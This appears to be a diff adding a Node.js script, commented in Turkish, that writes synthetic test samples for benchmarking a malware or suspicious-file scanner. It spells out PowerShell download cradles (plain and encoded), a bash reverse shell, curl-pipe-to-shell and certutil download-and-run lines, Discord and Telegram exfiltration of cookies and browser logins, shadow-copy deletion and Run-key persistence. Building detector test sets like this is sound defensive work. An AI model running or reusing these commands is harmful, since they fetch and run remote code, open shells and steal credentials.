@@ -1,0 +1,32 @@
+// Karsilastirma icin sentetik ORNEKLER uretir (zararsiz metin; hicbiri calistirilabilir degil). Kullanim: node make-corpus.mjs <cikti-dizini>
+import fs from 'node:fs';
+import path from 'node:path';
+const out = process.argv[2]; fs.mkdirSync(out, { recursive: true });
+const w = (n, d) => fs.writeFileSync(path.join(out, n), d);
+const b64 = (s) => Buffer.from(s).toString('base64');
+const hook = 'https://discord.com/api/webhooks/123456789012345678/' + 'abcDEF_ghiJKL-mnoPQRstuVWXyz0123456789abcdefghijkl';
+w('webhook.js', `const u='${hook}'; fetch(u,{method:'POST',body:JSON.stringify({content:document.cookie})});\n`);
+w('ps_download.ps1', `powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.7/a.ps1')"\n`);
+w('ps_enc.bat', `@echo off\npowershell -NoProfile -EncodedCommand ${b64(Buffer.from('Write-Host "hello from encoded command, long enough payload"', 'utf16le').toString('latin1').replace(/./g, (c) => c))}\n`);
+w('b64_layer.js', `var x='${b64('powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString("http://198.51.100.9/x")  ; Add-MpPreference -ExclusionPath C:\\\\')}';\n`);
+w('hex_layer.js', `var h='${Buffer.from('curl http://198.51.100.10/a.sh | sh ; vssadmin delete shadows /all /quiet').toString('hex')}';\n`);
+w('revshell.sh', `bash -i >& /dev/tcp/203.0.113.9/4444 0>&1\ncurl http://203.0.113.9/x | sh\n`);
+w('persist.reg', `Windows Registry Editor Version 5.00\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\n"x"="C:\\\\Users\\\\a\\\\AppData\\\\Roaming\\\\x.exe"\n`);
+w('certutil.cmd', `certutil -urlcache -split -f http://203.0.113.5/a.exe %TEMP%\\a.exe & %TEMP%\\a.exe\n`);
+w('telegram.py', `import requests\nrequests.post("https://api.telegram.org/bot123456:ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghi/sendMessage", data={"text": open("Login Data").read()})\n`);
+w('eval_obf.js', `eval(unescape('%61%6c%65%72%74') + atob('YWxlcnQoMSk=')); ` + 'String.fromCharCode(65,66)'.repeat(70) + '\n');
+w('oneline.js', 'var a=' + JSON.stringify('x'.repeat(25000)) + ';\n');
+w('hta_app.hta', `<hta:application id="x"/><script language="vbscript">CreateObject("WScript.Shell").Run "cmd /c calc"</script>\n`);
+w('shortcut_like.lnk', Buffer.concat([Buffer.from([0x4c, 0, 0, 0]), Buffer.from('\x01\x14\x02\x00'), Buffer.alloc(60), Buffer.from('C:\\Windows\\System32\\cmd.exe /c powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString(\'http://203.0.113.5/z\')')]));
+const rnd = Buffer.alloc(30000); let s = 12345; for (let i = 0; i < rnd.length; i++) { s = (s * 1103515245 + 12345) & 0x7fffffff; rnd[i] = (s >> 8) & 255; }
+w('random.dat', rnd);
+const mz = Buffer.alloc(300); mz[0x3c] = 0x80; mz.write('PE\0\0', 0x80, 'latin1'); mz.write('This program cannot be run in DOS mode', 0x40, 'latin1'); mz[0] = 0x4d; mz[1] = 0x5a;
+const key = 0x5a; const blob = Buffer.concat([Buffer.alloc(9000, 1), Buffer.from(mz.map((b) => b ^ key)), Buffer.alloc(9000, 2)]);
+w('xor_blob.dat', blob);
+w('wallets.txt', `bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh 0x32Be343B94f860124dC4fEe278FDCBD38C102D88 alice@example.org 8.8.8.8 10.0.0.1 http://example.net/path?x=1\n`);
+w('utf16.txt', Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from('powershell -nop -w hidden IEX (New-Object Net.WebClient).DownloadString("http://203.0.113.5/q")', 'utf16le')]));
+w('rtlo_\u202efdp.exe.txt', 'hi');
+w('invoice.pdf.exe', 'text pretending');
+w('empty.txt', '');
+w('benign_html.html', '<html><body><h1>Merhaba</h1><script>console.log("hi")</script></body></html>\n');
+w('dl_exe.txt', 'wget http://203.0.113.20/payload.exe -O /tmp/p.exe\n');
